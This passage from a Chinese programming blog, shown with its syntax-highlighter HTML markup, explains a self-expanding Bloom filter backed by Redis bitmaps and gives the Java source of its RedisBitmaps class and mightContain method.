class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">ensureCapacityInternal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//自动扩容</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitsChanged</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">@</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Override</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-25\"><span class=\"crayon-e\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisBitmaps </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">bitSize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">byte</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bytes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Hashing</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">murmur3_128</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">hashString</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Charsets</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">UTF_8</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">asBytes</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lowerEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-29\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">upperEight</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bytes</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-31\"><span class=\"crayon-c\">//        for (int i = 0; i &lt; numHashFunctions; i++) {</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-32\"><span class=\"crayon-c\">//            if (!bits.get((combinedHash &amp; Long.MAX_VALUE) % bitSize)) {</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-33\"><span class=\"crayon-c\">//                return false;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-34\"><span class=\"crayon-c\">//            }</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-35\"><span class=\"crayon-c\">//            combinedHash += hash2;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-36\"><span class=\"crayon-c\">//        }</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-37\"><span class=\"crayon-c\">//        return true;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-39\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-40\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">MAX_VALUE</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-41\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">combinedHash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">hash2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-42\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb51485687448-43\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">offsets</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb51485687448-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0080 seconds] -->\r\n<p>最后，也是最重要的RedisBitmaps，其中bitSize用了Guava布隆过滤器中计算Long型数组长度的方法，得到bitSize之后使用setbit命令初始化一个全部为0的位数组。get(long offset)和set(long offset)，这两个与Guava布隆过滤器中的逻辑类似，这里就不再赘述了，而get(long[] offsets)方法中，所有的offset要与每一个cursor对应的Bitmaps进行判断，若全部命中，那么这个元素就可能存在于该Bitmaps，反之若不能完全命中，则表示该元素不存在于任何一个Bitmaps，所以当满足这个条件，在set(long[] offsets)方法中，就可以插入到当前key的Bitmaps中了。</p>\n<p>在ensureCapacityInternal方法，判断需要扩容的条件是bitCount*2&gt;bitSize，bitCount表示一个Bitmaps中“1”出现的个数，也就是当“1”出现的个数超过总数的一半时，进行扩容操作——首先使用incr命令对cursor自增，然后使用新的key创建一个新的Bitmaps。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6359b36cb56684974781\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass RedisBitmaps {\r\n\r\n    private static final String BASE_KEY = \"bloomfilter\";\r\n    private static final String CURSOR = \"cursor\";\r\n\r\n    private JedisUtils jedisUtils;\r\n    private long bitSize;\r\n\r\n    RedisBitmaps(long bits) {\r\n        this.jedisUtils = new JedisUtils();\r\n        this.bitSize = LongMath.divide(bits, 64, RoundingMode.CEILING) * Long.SIZE;//位数组的长度，相当于n个long的长度\r\n        if (bitCount() == 0) {\r\n            jedisUtils.execute((jedis -&gt; jedis.setbit(currentKey(), bitSize - 1, false)));\r\n        }\r\n    }\r\n\r\n   boolean get(long[] offsets) {\r\n        for (long i = 0; i &lt; cursor() + 1; i++) {\r\n            final long cursor = i;\r\n            //只要有一个cursor对应的bitmap中，offsets全部命中，则表示可能存在\r\n            boolean match = Arrays.stream(offsets).boxed()\r\n                    .map(offset -&gt; jedisUtils.execute(jedis -&gt; jedis.getbit(genkey(cursor), offset)))\r\n                    .allMatch(b -&gt; (Boolean) b);\r\n            if (match)\r\n                return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    boolean get(final long offset) {\r\n        return jedisUtils.execute(jedis -&gt; jedis.getbit(currentKey(), offset));\r\n    }\r\n\r\n    boolean set(long[] offsets) {\r\n        if (cursor() &gt; 0 &amp;&amp; get(offsets)) {\r\n            return false;\r\n        }\r\n        boolean bitsChanged = false;\r\n        for (long offset : offsets)\r\n            bitsChanged |= set(offset);\r\n        return bitsChanged;\r\n    }\r\n\r\n    boolean set(long offset) {\r\n        if (!get(offset)) {\r\n            jedisUtils.execute(jedis -&gt; jedis.setbit(currentKey(), offset, true));\r\n            return true;\r\n        }\r\n        return false;\r\n    }\r\n\r\n    long bitCount() {\r\n        return jedisUtils.execute(jedis -&gt; jedis.bitcount(currentKey()));\r\n    }\r\n\r\n    long bitSize() {\r\n        return this.bitSize;\r\n    }\r\n\r\n    private String currentKey() {\r\n        return genkey(cursor());\r\n    }\r\n\r\n    private String genkey(long cursor) {\r\n        return BASE_KEY + \"-\" + cursor;\r\n    }\r\n\r\n    private Long cursor() {\r\n        String cursor = jedisUtils.execute(jedis -&gt; jedis.get(CURSOR));\r\n        return cursor == null ? 0 : Longs.tryParse(cursor);\r\n    }\r\n\r\n    void ensureCapacityInternal() {\r\n        if (bitCount() * 2 &gt; bitSize())\r\n            grow();\r\n    }\r\n\r\n    void grow() {\r\n        Long cursor = jedisUtils.execute(jedis -&gt; jedis.incr(CURSOR));\r\n        jedisUtils.execute((jedis -&gt; jedis.setbit(genkey(cursor), bitSize - 1, false)));\r\n    }\r\n\r\n    void reset() {\r\n        String[] keys = LongStream.range(0, cursor() + 1).boxed().map(this::genkey).toArray(String[]::new);\r\n        jedisUtils.execute(jedis -&gt; jedis.del(keys));\r\n        jedisUtils.execute(jedis -&gt; jedis.set(CURSOR, \"0\"));\r\n        jedisUtils.execute(jedis -&gt; jedis.setbit(currentKey(), bitSize - 1, false));\r\n    }\r\n\r\n    private PipelineExecutor apply(PipelineExecutor executor) {\r\n        return executor;\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-85\">85</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-86\">86</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-87\">87</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-88\">88</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-89\">89</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-90\">90</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-91\">91</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6359b36cb56684974781-92\">92</div><div class=\"crayon-num\" data-line=\"crayon-5a6359b36cb56684974781-93\">93</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RedisBitmaps</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BASE_KEY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"bloomfilter\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">CURSOR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"cursor\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisUtils </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">RedisBitmaps</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JedisUtils</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LongMath</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">divide</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RoundingMode</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">CEILING</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">Long</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SIZE</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">//位数组的长度，相当于n个long的长度</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6359b36cb56684974781-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">bitCount</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6359b36cb56684974781-13\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">jedisUtils</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jedis</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">jedis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">setbit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">currentKey</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bitSize</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> 